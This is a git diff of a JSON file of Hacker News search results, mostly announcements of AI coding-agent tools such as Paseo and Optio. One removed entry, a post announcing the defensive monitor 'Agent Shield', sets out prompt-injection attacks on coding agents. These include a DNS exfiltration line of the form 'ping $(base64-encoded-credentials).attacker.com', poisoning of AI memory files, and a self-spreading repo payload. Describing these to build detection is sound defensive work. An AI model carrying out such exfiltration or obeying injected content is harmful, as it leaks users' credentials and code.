@@ -1,5 +1,5 @@
 {
-  "timestamp": "2026-03-26T11:48:15.818Z",
+  "timestamp": "2026-03-26T13:25:55.093Z",
   "queries": [
     {
       "query": "AI+agent+terminal",
@@ -203,8 +203,8 @@
           "children": [
             47498409,
             47496895,
-            47518087,
             47499371,
+            47518087,
             47508348,
             47499342,
             47499000,
@@ -224,7 +224,7 @@
           "story_id": 47494696,
           "story_text": "I ran an experiment to see if CLI actually was the most intuitive format for tool calling. (As claimed by a ex-Manus AI Backend Engineer) I gave my model random scenarios and a single tool &quot;run&quot; - i told it that it worked like a CLI. I told it to guess commands.<p>it guessed great commands, but it formatted it always with a colon up front, like \n:help\n:browser\n:search\n:curl<p>It was trained on how terminals look, not what you actually type (you don&#x27;t type the &quot;:&quot;)<p>I have since updated my code in my agent tool to stop fighting against this intuition.<p>LLMs they learn what commands look like in documentation&#x2F;artifacts, not what the human actually typed on the keyboard.<p>Seems so obvious. This is why you have to test your LLM and see how it naturally works, so you don&#x27;t have to fight it with your system prompt.<p>This is Kimi K2.5 Btw.",
           "title": "LLMs learn what programmers create, not how programmers work",
-          "updated_at": "2026-03-26T05:23:48Z"
+          "updated_at": "2026-03-26T12:30:33Z"
         },
         {
           "_highlightResult": {
@@ -280,6 +280,105 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
+              "value": "boudra"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "source",
+                "agent"
+              ],
+              "value": "Hey HN, I'm Mo. I'm building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there's a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the <em>agent</em> was doing, then I wanted to text it when I couldn't talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don't step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party <em>agent</em> CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I'd say that with discipline it's doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it's holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced <em>agent</em> orchestration, it has much better ergonomics than existing harnesses, and I'm already using it to experiment with loops and <em>agent</em> teams, although it's still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you're locked onto their models. Most other alternatives I know about found are either closed <em>source</em> or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that's all you need. But you can also `npm install -g @getpaseo/cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https://github.com/getpaseo/paseo\" rel=\"nofollow\">https://github.com/getpaseo/paseo</a><p>Homepage: <a href=\"https://paseo.sh/\" rel=\"nofollow\">https://paseo.sh/</a><p>Discord: <a href=\"https://discord.gg/jz8T2uahpH\" rel=\"nofollow\">https://discord.gg/jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!<p>---<p>I resubmitted this post because I forgot to add the URL and it didn't allow me to add it later."
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "open",
+                "source",
+                "coding",
+                "agent"
+              ],
+              "value": "Show HN: Paseo – <em>Open</em>-<em>source</em> <em>coding</em> <em>agent</em> interface (desktop, mobile, CLI)"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://github.com/getpaseo/paseo"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_boudra",
+            "story_47530027",
+            "show_hn"
+          ],
+          "author": "boudra",
+          "created_at": "2026-03-26T13:11:34Z",
+          "created_at_i": 1774530694,
+          "num_comments": 0,
+          "objectID": "47530027",
+          "points": 4,
+          "story_id": 47530027,
+          "story_text": "Hey HN, I&#x27;m Mo. I&#x27;m building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there&#x27;s a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn&#x27;t talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don&#x27;t step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I&#x27;d say that with discipline it&#x27;s doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it&#x27;s holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I&#x27;m already using it to experiment with loops and agent teams, although it&#x27;s still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you&#x27;re locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that&#x27;s all you need. But you can also `npm install -g @getpaseo&#x2F;cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo</a><p>Homepage: <a href=\"https:&#x2F;&#x2F;paseo.sh&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;paseo.sh&#x2F;</a><p>Discord: <a href=\"https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH\" rel=\"nofollow\">https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!<p>---<p>I resubmitted this post because I forgot to add the URL and it didn&#x27;t allow me to add it later.",
+          "title": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)",
+          "updated_at": "2026-03-26T13:23:50Z",
+          "url": "https://github.com/getpaseo/paseo"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "boudra"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "source",
+                "agent"
+              ],
+              "value": "Hey HN, I'm Mo. I'm building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there's a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the <em>agent</em> was doing, then I wanted to text it when I couldn't talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don't step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party <em>agent</em> CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I'd say that with discipline it's doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it's holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced <em>agent</em> orchestration, it has much better ergonomics than existing harnesses, and I'm already using it to experiment with loops and <em>agent</em> teams, although it's still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you're locked onto their models. Most other alternatives I know about found are either closed <em>source</em> or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that's all you need. But you can also `npm install -g @getpaseo/cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https://github.com/getpaseo/paseo\" rel=\"nofollow\">https://github.com/getpaseo/paseo</a><p>Homepage: <a href=\"https://paseo.sh/\" rel=\"nofollow\">https://paseo.sh/</a><p>Discord: <a href=\"https://discord.gg/jz8T2uahpH\" rel=\"nofollow\">https://discord.gg/jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!"
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "open",
+                "source",
+                "coding",
+                "agent"
+              ],
+              "value": "Show HN: Paseo – <em>Open</em>-<em>source</em> <em>coding</em> <em>agent</em> interface (desktop, mobile, CLI)"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_boudra",
+            "story_47529963",
+            "show_hn"
+          ],
+          "author": "boudra",
+          "children": [
+            47530049
+          ],
+          "created_at": "2026-03-26T13:06:06Z",
+          "created_at_i": 1774530366,
+          "num_comments": 1,
+          "objectID": "47529963",
+          "points": 3,
+          "story_id": 47529963,
+          "story_text": "Hey HN, I&#x27;m Mo. I&#x27;m building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there&#x27;s a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn&#x27;t talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don&#x27;t step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I&#x27;d say that with discipline it&#x27;s doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it&#x27;s holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I&#x27;m already using it to experiment with loops and agent teams, although it&#x27;s still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you&#x27;re locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that&#x27;s all you need. But you can also `npm install -g @getpaseo&#x2F;cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo</a><p>Homepage: <a href=\"https:&#x2F;&#x2F;paseo.sh&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;paseo.sh&#x2F;</a><p>Discord: <a href=\"https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH\" rel=\"nofollow\">https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!",
+          "title": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)",
+          "updated_at": "2026-03-26T13:15:35Z"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
               "value": "jawiggins"
             },
             "story_text": {
@@ -317,7 +416,10 @@
           ],
           "author": "jawiggins",
           "children": [
+            47530136,
             47528314,
+            47530037,
+            47529759,
             47528440,
             47525453,
             47524587,
@@ -325,22 +427,23 @@
             47525855,
             47527135,
             47525213,
+            47527060,
             47524594,
             47526092,
-            47527060,
             47525242,
+            47529597,
             47524726,
             47525020
           ],
           "created_at": "2026-03-25T17:10:21Z",
           "created_at_i": 1774458621,
-          "num_comments": 33,
+          "num_comments": 38,
           "objectID": "47520220",
-          "points": 59,
+          "points": 64,
           "story_id": 47520220,
           "story_text": "I think like many of you, I&#x27;ve been jumping between many claude code&#x2F;codex sessions at a time, managing multiple lines of work and worktrees in multiple repos. I wanted a way to easily manage multiple lines of work and reduce the amount of input I need to give, allowing the agents to remove me as a bottleneck from as much of the process as I can. So I built an orchestration tool for AI coding agents:<p>Optio is an open-source orchestration system that turns tickets into merged pull requests using AI coding agents. You point it at your repos, and it handles the full lifecycle:<p>- Intake — pull tasks from GitHub Issues, Linear, or create them manually<p>- Execution — spin up isolated K8s pods per repo, run Claude Code or Codex in git worktrees<p>- PR monitoring — watch CI checks, review status, and merge readiness every 30s<p>- Self-healing — auto-resume the agent on CI failures, merge conflicts, or reviewer change requests<p>- Completion — squash-merge the PR and close the linked issue<p>The key idea is the feedback loop. Optio doesn&#x27;t just run an agent and walk away — when CI breaks, it feeds the failure back to the agent. When a reviewer requests changes, the comments become the agent&#x27;s next prompt. It keeps going until the PR merges or you tell it to stop.<p>Built with Fastify, Next.js, BullMQ, and Drizzle on Postgres. Ships with a Helm chart for production deployment.",
           "title": "Show HN: Optio – Orchestrate AI coding agents in K8s to go from ticket to PR",
-          "updated_at": "2026-03-26T11:48:03Z",
+          "updated_at": "2026-03-26T13:25:20Z",
           "url": "https://github.com/jonwiggins/optio"
         },
         {
@@ -434,158 +537,6 @@
           "title": "Show HN: Using Claude Code history to predict your next messages while you sleep",
           "updated_at": "2026-03-24T11:22:25Z",
           "url": "https://workovernight.com"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "jberthom"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "open",
-                "source",
-                "coding",
-                "agent"
-              ],
-              "value": "I use AI <em>agents</em> to build UI features daily. The thing that kept annoying me: the <em>agent</em> writes code but never sees what it actually looks like in the browser. It can’t tell if the layout is broken or if the console is throwing errors.<p>So I built a CLI that lets the <em>agent</em> <em>open</em> a browser, interact with the page, record what happens, and collect any errors. Then it bundles everything — video, screenshots, logs — into a self-contained HTML file I can review in seconds.<p><pre><code>  proofshot start --run &quot;npm run dev&quot; --port 3000\n  # <em>agent</em> navigates, clicks, takes screenshots\n  proofshot stop\n</code></pre>\nIt works with whatever <em>agent</em> you use (Claude Code, Cursor, Codex, etc.) — it’s just shell commands. It's packaged as a skill so your AI <em>coding</em> <em>agent</em> knows exactly how it works. It's built on <em>agent</em>-browser from Vercel Labs which is far better and faster than Playwright MCP.<p>It’s not a testing framework. The <em>agent</em> doesn’t decide pass/fail. It just gives me the evidence so I don’t have to <em>open</em> the browser myself every time.<p><em>Open</em> <em>source</em> and completely free.<p>Website: <a href=\"https://proofshot.argil.io/\" rel=\"nofollow\">https://proofshot.argil.io/</a>"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "coding",
-                "agent"
-              ],
-              "value": "Show HN: ProofShot – Give AI <em>coding</em> <em>agents</em> eyes to verify the UI they build"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/AmElmo/proofshot"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_jberthom",
-            "story_47499672",
-            "show_hn"
-          ],
-          "author": "jberthom",
-          "children": [
-            47500311,
-            47499984,
-            47500594,
-            47500072,
-            47508231,
-            47501289,
-            47500124,
-            47521650,
-            47504657,
-            47500306,
-            47500259,
-            47500795,
-            47519493,
-            47500065,
-            47501072,
-            47500553,
-            47499937,
-            47501515,
-            47525072,
-            47500018,
-            47512934,
-            47501986,
-            47507203,
-            47514234,
-            47507728,
-            47500879,
-            47507003,
-            47499968,
-            47507229,
-            47502729,
-            47510958,
-            47500293,
-            47508601,
-            47501069,
-            47501177,
-            47514918,
-            47499959,
-            47500786,
-            47500426,
-            47528571,
-            47522033,
-            47507562,
-            47507327,
-            47512267,
-            47500788,
-            47524746,
-            47501768,
-            47510731,
-            47510460,
-            47509170,
-            47499977
-          ],
-          "created_at": "2026-03-24T07:46:46Z",
-          "created_at_i": 1774338406,
-          "num_comments": 96,
-          "objectID": "47499672",
-          "points": 152,
-          "story_id": 47499672,
-          "story_text": "I use AI agents to build UI features daily. The thing that kept annoying me: the agent writes code but never sees what it actually looks like in the browser. It can’t tell if the layout is broken or if the console is throwing errors.<p>So I built a CLI that lets the agent open a browser, interact with the page, record what happens, and collect any errors. Then it bundles everything — video, screenshots, logs — into a self-contained HTML file I can review in seconds.<p><pre><code>  proofshot start --run &quot;npm run dev&quot; --port 3000\n  # agent navigates, clicks, takes screenshots\n  proofshot stop\n</code></pre>\nIt works with whatever agent you use (Claude Code, Cursor, Codex, etc.) — it’s just shell commands. It&#x27;s packaged as a skill so your AI coding agent knows exactly how it works. It&#x27;s built on agent-browser from Vercel Labs which is far better and faster than Playwright MCP.<p>It’s not a testing framework. The agent doesn’t decide pass&#x2F;fail. It just gives me the evidence so I don’t have to open the browser myself every time.<p>Open source and completely free.<p>Website: <a href=\"https:&#x2F;&#x2F;proofshot.argil.io&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;proofshot.argil.io&#x2F;</a>",
-          "title": "Show HN: ProofShot – Give AI coding agents eyes to verify the UI they build",
-          "updated_at": "2026-03-26T11:35:34Z",
-          "url": "https://github.com/AmElmo/proofshot"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "shadag"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "open",
-                "source",
-                "coding",
-                "agent"
-              ],
-              "value": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~/.ssh. That bothered me enough that I built something to find out.<p>The result is <em>Agent</em> Shield — a background daemon that watches AI <em>coding</em> tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local <em>source</em> files, git pushes to spread, infects the next developer's AI <em>agent</em>. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig's announcement this week — sits in the network path and inspects API calls. That architecture can't see file reads, subprocess spawning, or DNS exfiltration via ping. It can't monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn't the API layer. It's the OS.<p>What's built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~/.claude/, ~/.cursor/, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill/suspend/block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research <em>agent</em> (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going <em>open</em> <em>source</em> (MIT) as part of this release."
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "coding"
-              ],
-              "value": "AI <em>coding</em> tools have broad filesystem and network access"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_shadag",
-            "story_47498251",
-            "ask_hn"
-          ],
-          "author": "shadag",
-          "children": [
-            47498256,
-            47500819
-          ],
-          "created_at": "2026-03-24T03:16:03Z",
-          "created_at_i": 1774322163,
-          "num_comments": 1,
-          "objectID": "47498251",
-          "points": 1,
-          "story_id": 47498251,
-          "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
-          "title": "AI coding tools have broad filesystem and network access",
-          "updated_at": "2026-03-24T10:49:54Z"
         }
       ]
     },
@@ -842,6 +793,168 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
+              "value": "boudra"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "Hey HN, I'm Mo. I'm building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there's a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn't talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don't step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to <em>bot</em>h native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I'd say that with discipline it's doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it's holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I'm already using it to experiment with loops and agent teams, although it's still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you're locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that's all you need. But you can also `npm install -g @getpaseo/cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https://github.com/getpaseo/paseo\" rel=\"nofollow\">https://github.com/getpaseo/paseo</a><p>Homepage: <a href=\"https://paseo.sh/\" rel=\"nofollow\">https://paseo.sh/</a><p>Discord: <a href=\"https://discord.gg/jz8T2uahpH\" rel=\"nofollow\">https://discord.gg/jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!<p>---<p>I resubmitted this post because I forgot to add the URL and it didn't allow me to add it later."
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://github.com/getpaseo/paseo"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_boudra",
+            "story_47530027",
+            "show_hn"
+          ],
+          "author": "boudra",
+          "created_at": "2026-03-26T13:11:34Z",
+          "created_at_i": 1774530694,
+          "num_comments": 0,
+          "objectID": "47530027",
+          "points": 4,
+          "story_id": 47530027,
